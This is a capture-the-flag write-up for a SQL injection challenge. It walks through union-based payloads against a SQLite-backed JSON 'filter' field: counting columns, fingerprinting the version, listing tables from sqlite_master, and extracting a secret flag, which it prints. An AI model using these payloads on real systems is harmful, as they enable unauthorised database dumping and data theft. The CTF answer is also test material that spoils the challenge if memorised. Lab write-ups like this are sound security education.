This challenge has the same endpoint as the first, with the same injection point. We simply need to detect the database type and then dump the entire database.

The request has six columns:
```
{"filter":"Finance' order by 6 -- -"}
```
as order by 7 gives us an error.

So the database is sqlite:
`{"filter":"Finance' union select (select sqlite_version()),2,3,4,5,6 -- -"}` gives us
```
[{"employee_name":"3.44.2","request_detail":2,"status":3,"department":4,"role":5,"email":6}]
```

Get the table names:
`{"filter":"Finance' union select (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),2,3,4,5,6 -- -"}` gives us 
`"requests,flags"`

And then dump flags:
`{"filter":"Finance' union select (SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flags'),2,3,4,5,6 -- -"}`
gives:
```
CREATE TABLE flags (\n      request_id INTEGER,\n      secret_flag TEXT,\n      FOREIGN KEY (request_id) REFERENCES requests(id)\n    )
```

And then go through the offsets until we have the full flag:
```
{"filter":"Finance' union select (SELECT secret_flag FROM flags LIMIT 1 OFFSET 1),2,3,4,5,6 -- -"}
```

which is: KashiCTF{b0r1ng_old_c0rp0_l1f3_am_1_r1gh7_PR34i8kN}

